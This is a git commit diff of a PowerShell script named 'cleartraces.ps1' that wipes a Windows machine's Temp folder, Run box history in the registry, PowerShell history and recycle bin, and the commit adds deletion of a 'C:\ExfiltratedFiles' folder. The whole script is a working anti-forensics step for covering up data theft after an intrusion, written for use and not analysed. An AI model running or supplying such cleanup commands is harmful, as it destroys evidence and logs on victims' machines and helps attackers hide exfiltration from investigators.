eed3367457bd0b7418d438f05b173aa759b5901b
felipevuln <121352298+felipevuln@users.noreply.github.com>
2025-01-25 19:29:23 +0200

    Update cleartraces.ps1

--- cleartraces.ps1
+++ cleartraces.ps1
@@ -1,15 +1,14 @@
 # Delete contents of Temp folder 
-
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
-
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
-
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
-# Deletes contents of recycle bin
+# Delete the ExfiltratedFiles folder (if it exists)
+Remove-Item -Path "C:\ExfiltratedFiles" -Recurse -Force -ErrorAction SilentlyContinue
 
+# Deletes contents of recycle bin
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
